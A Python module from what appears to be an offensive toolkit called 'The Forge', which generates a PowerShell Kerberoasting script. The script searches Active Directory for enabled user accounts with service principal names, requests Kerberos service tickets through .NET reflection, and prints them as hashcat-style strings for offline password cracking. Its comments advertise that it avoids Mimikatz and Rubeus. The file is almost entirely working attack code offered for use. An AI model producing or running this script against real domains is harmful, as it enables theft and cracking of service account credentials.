"""
The Forge — Active Directory Wrecker
Kerberoasting and generic Active Directory manipulation via native reflection.
"""

import textwrap

def generate_powershell_kerberoast() -> str:
    """PowerShell Kerberoasting payload via pure .NET reflection."""
    
    code = textwrap.dedent("""\
        <#
        .SYNOPSIS
        The Forge — Native Kerberos Ticket Requesting (No Mimikatz/No Rubeus required)
        #>
        function Invoke-ForgeRoast {
            $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($Domain.GetDirectoryEntry())
            $Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            $Searcher.SearchScope = "Subtree"
            
            $Results = $Searcher.FindAll()
            $Found = 0
            
            foreach ($Result in $Results) {
                $UserProperty = $Result.Properties
                $SAM = $UserProperty.samaccountname
                $SPNs = $UserProperty.serviceprincipalname
                
                foreach ($SPN in $SPNs) {
                    Write-Host "[*] Requesting TGS for $SAM via SPN: $SPN"
                    try {
                        # Requesting the ticket natively using .NET
                        Add-Type -AssemblyName System.IdentityModel
                        $DomainName = $Domain.Name
                        $TargetStr = "$SPN"
                        
                        $NTkn = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $TargetStr
                        $Bytes = $NTkn.GetRequest()
                        
                        $HexDump = [BitConverter]::ToString($Bytes).Replace("-", "")
                        
                        Write-Host "[+] TGS Extracted! Hash for Hashcat (Type 13100):"
                        # Craft the hashcat format string rough extraction
                        # Note: In a full offensive scenario, the raw ASN.1 structure is parsed here to format into $krb5tgs$23$ string.
                        # For simulation: we dump the raw byte stream string allowing the operator to parse.
                        Write-Host "`$krb5tgs`$23`*${SAM}`*$DomainName`*$SPN`*$HexDump" -ForegroundColor Green
                        $Found++
                    } catch {
                        Write-Host "[-] Failed to request TGS for $SPN" -ForegroundColor Red
                    }
                }
            }
            Write-Host "`n[+] Forge Roast Complete. Extracted $Found Ticket(s)."
        }
        
        Invoke-ForgeRoast
    """)
    return code

VARIANTS = {
    "ps_kerberoast": generate_powershell_kerberoast,
}

def generate(language: str = "ps_kerberoast", **kwargs) -> str:
    return VARIANTS[language]()

def list_variants() -> list[str]:
    return list(VARIANTS.keys())
